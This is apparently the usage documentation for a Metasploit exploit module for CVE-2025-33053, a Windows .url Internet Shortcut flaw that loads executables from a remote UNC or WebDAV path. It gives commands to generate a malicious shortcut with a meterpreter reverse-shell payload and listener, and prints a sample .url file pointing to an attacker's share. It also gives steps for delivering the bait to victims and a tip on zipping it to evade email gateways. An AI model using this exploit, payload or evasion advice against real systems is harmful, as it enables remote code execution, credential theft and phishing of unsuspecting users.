## Vulnerable Application

CVE-2025-33053 - Internet Shortcut (.url) UNC Path Exploit

Windows improperly handles `.url` (Internet Shortcut) files referencing remote
UNC paths.
Specifically, `.url` files that specify a remote working directory
(`WorkingDirectory=\\attacker\webdav`) and a trusted executable (e.g.,
`iediagcmd.exe`)
may cause the system to access the attacker's server when opened.

This behavior can be exploited to:

- Trigger NTLM authentication leaks (SMB relay)
- Load remote payloads via WebDAV shares
- Attempt DLL sideloading if conditions allow

## Affected Versions

- Windows 10 22H2
- Windows 11 23H2
- Fully patched prior to June 2025 Patch Tuesday

## Verification Steps

1. Let the module setup WebDAV or do it manually
2. Use the module to generate a `.url` file
3. Deliver the `.url` to the target (email, USB, zip)
4. On victim machine, open `.url`
5. Observe connection back to WebDAV server

## Overview

This module generates a malicious `.url` Internet Shortcut file that abuses
CVE-2025-33053 â€”
a vulnerability in how Windows handles `.url` files referencing remote UNC
paths.

When opened on a vulnerable system, the `.url` causes the system to connect to a
UNC path
(e.g., a WebDAV share), triggering an attempt to execute a trusted binary
from the attacker's location. This can result in RCE or credential leaks.

It supports:

- Auto-generating a reverse shell payload
- Hosting the payload in a WebDAV share
- Launching a Metasploit handler

## Module Information

**Module Name**: exploits/windows/fileformat/cve_2025_33053
**Authors**:

- Dev Bui Hieu

**Disclosure Date**: 2025-06-11
**License**: MSF_LICENSE
**Rank**: Normal

## Options

### GEN_PAYLOAD

Whether to generate payload and move to WebDAV directory (default: true)

### START_LISTENER

Whether to auto-start a Metasploit multi/handler (default: true)

### WEBDAV_DIR

WebDAV folder for payload and .url (default: /var/www/webdav)

### OUTFILE

Output .url filename (default: bait.url)

### LOLBAS_EXE

Path to a trusted executable to launch (default: iediagcmd.exe)

### ICON_PATH

Icon used for the shortcut (default: msedge.exe)

### ICON_INDEX

Index of the icon in the icon file (default: 13)

### MODIFIED_HEX

Modified timestamp value for the .url file (default: 20F06BA06D07BD014D)

## Scenarios

You can use this module in:

- Phishing simulations
- Red team operations
- Awareness training
- DLL sideloading test
- Drive-by UNC path abuse

## Example Usage

```console
use exploits/windows/fileformat/cve_2025_33053
set LHOST 192.168.1.10
run
```console

Optional:

```console
set WEBDAV_DIR /var/www/webdav
set OUTFILE clickme.url
set PAYLOAD windows/x64/meterpreter/reverse_http
set START_LISTENER true
run
```console

## Output

Example .url file:

```console
[InternetShortcut]
URL=C:\Program Files\Internet Explorer\iediagcmd.exe
WorkingDirectory=\\192.168.1.10\webdav\
ShowCommand=7
IconIndex=13
IconFile=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
Modified=20F06BA06D07BD014D
```console

## References

- [GitHub PoC](https://github.com/DevBuiHieu/CVE-2025-33053-Proof-Of-Concept)
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2025-33053)
- [LOLBAS Project](https://lolbas-project.github.io)
- [Microsoft Advisory](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2025-33053)

## Notes

- Payload hosted via WebDAV must be reachable from the victim
- On patched systems, SmartScreen or Defender may block the connection
- Zip `.url` to evade email gateway protections
- Listener starts automatically if `START_LISTENER` is true
